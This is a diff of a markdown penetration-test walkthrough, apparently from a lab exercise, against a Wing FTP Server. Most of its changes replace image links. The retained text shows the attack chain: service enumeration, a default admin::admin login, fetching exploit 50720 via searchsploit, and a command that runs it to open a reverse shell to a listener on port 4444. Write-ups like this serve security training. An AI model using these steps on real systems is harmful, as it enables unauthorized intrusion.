@@ -32,11 +32,11 @@ anonymous::anonymous
 "Login failed"
 ```
 
-![[Pasted image 20260226134440.png]]
+![FTP anonymous login failed Results](ss/anonymous_login_failed.png)
 
 Lets check version, Wing FTP Server
 
-![[Pasted image 20260226134621.png]]
+![Searchsploit Results](ss/3.png)
 
 Seems like a lot of information here, but couldn't get any version yet, lets do more enumeration here.
 
@@ -48,7 +48,7 @@ from the opening port, i saw smb port is open. Lets do smb port enumeration
 smbclient -L //$ip
 ```
 
-![[Pasted image 20260226134915.png]]
+![SMB Results](ss/4.png)
 
 it seems like they dont have any share group here
 
@@ -60,11 +60,11 @@ enum4linux -a $ip
 
 ## HTTP Port Open
 
-![[Pasted image 20260226134740.png]]
+![http scan Results](ss/5.png)
 
 from nmap scan, i could see it is related to Wing FTP Server
 
-![[Pasted image 20260226135334.png]]
+![http web Results](ss/6.png)
 
 
 
@@ -76,18 +76,17 @@ gobuster dir -u http://$ip -w /usr/share/wordlists/dirb/common.txt -o gobuster/d
 dirsearch -u $ip
 ```
 
-![[Pasted image 20260226135758.png]]
+![ GoBuster Results](ss/7.png)
 
-![[Pasted image 20260226135950.png]]
+![Dirsearch Results](ss/8.png)
 
 it seems like they didn't show a lot information here.
-Lets try deep search
 
 ## http 5466
 
 hmm this is an admin page
 
-![[Pasted image 20260226142024.png]]
+![Web Application Results](ss/9.png)
 
 ```bash
 # lets try week password
@@ -98,11 +97,11 @@ admin::admin
 "Success"
 ```
 
-![[Pasted image 20260226142118.png]]
+![Success Results](ss/10.png)
 
 Lets see what kind of information, i can gain from here
 
-![[Pasted image 20260226142154.png]]
+![System Results](ss/10.png)
 
 seems like is a version 4.3.8
 
@@ -114,8 +113,7 @@ searchsploit wing ftp server 4.3.8
 searchsploit -m 50720
 ```
 
-![[Pasted image 20260226142325.png]]
-
+![Results](ss/11.png)
 found the exploit, which fit my case a lot
 
 ```bash
@@ -126,7 +124,8 @@ python3 50720.py 10.11.1.36 5466 172.16.1.2 4444 admin admin
 sudo nc -lnvp 4444
 ```
 
-![[Pasted image 20260226142725.png]]
+![ Results](ss/12.png)
+
 # local.txt
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -134,7 +133,7 @@ whoami
 id
 ```
 
-![[Pasted image 20260226142747.png]]
+![ Results](ss/13.png)
 
 # Windows Privilege Escalation
 ```powershell
@@ -145,4 +144,4 @@ type ket.txt
 
 ```
 
-![[Pasted image 20260226143304.png]]
+![ Results](ss/14.png)
